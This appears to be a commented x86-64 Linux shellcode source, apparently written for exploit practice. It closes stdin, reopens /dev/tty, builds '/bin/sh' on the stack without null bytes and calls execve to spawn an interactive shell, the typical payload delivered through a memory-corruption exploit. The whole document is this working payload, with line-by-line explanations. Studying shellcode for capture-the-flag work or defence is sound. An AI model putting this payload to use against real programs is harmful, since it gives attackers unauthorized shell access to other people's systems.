section .text ; Text section for code
global _start ; Begins execution at _start
_start:

; Close STDIN
xor rax, rax ; Clears the rax register
xor rdi, rdi ; Zero represents STDIN
mov al, 3 ; Syscall number for sys_close
syscall ; Calls sys_close(0)

; Opening "/dev/tty"
push rax ; Push a string terminator onto the stack
mov rdi, 0x7974742f7665642f ; Move "/dev/tty" (written backwards in ASCII) into rdi.
push rdi ; Push the string "/dev/tty" onto the stack.
push rsp ; Push a pointer to the string onto the stack.
pop rdi ; rdi now has a pointer to the string "/dev/tty"
        ; These last two lines are equivalent to doing "mov rdi, rsp"
push rax ; Push a NULL byte onto the stack
pop rsi ; Make rsi NULL
        ; These last two lines are equivalent to doing "mov rsi, 0"
mov si, 0x2702 ; Flag for O_RDWR
mov al, 0x2 ; Syscall for sys_open
syscall ; calls sys_open("/dev/tty", O_RDWR)

; Get 59 in rax
xor rax, rax ; Clear the rax register
mov al, 59 ; Syscall for execve

; Push a string terminator onto the stack
xor rbx, rbx ; Sets rbx to NULL
push rbx ; Pushes a NULL byte onto the stack

; Push /bin/sh onto the stack, and get a pointer to it in rdi
mov ebx, 0x68732f6e ; Moves "n/sh" (written backwards in ASCII) into lower-end bits of rbx
shl rbx, 16 ; Pushes "n/sh" to the left to make more room for 2 more bytes in rbx
mov bx, 0x6962 ; Move "bi" into lower-end bits of rbx. rbx is now equal to "bin/sh" written backwards
shl rbx, 16 ; Makes 2 extra bytes of room in rbx
mov bh, 0x2f ; "Moves /" into rbx. rbx is now equal to "\x00/bin/sh" written backwards
             ; Note that we are moving 0x2f into bh, not bl. So there is a NULL byte at the beginning
push rbx ; Push the string onto the stack
mov rdi, rsp ; Get a pointer to the string "\x00/bin/sh" in rdi
add rdi, 1 ; Add one to rdi, which will get rid of the NULL byte at the beginning.
           ; rdi now points to a string that equals "/bin/sh"

; Make these values NULL
xor rsi, rsi
xor rdx, rdx

; Call execve()
syscall
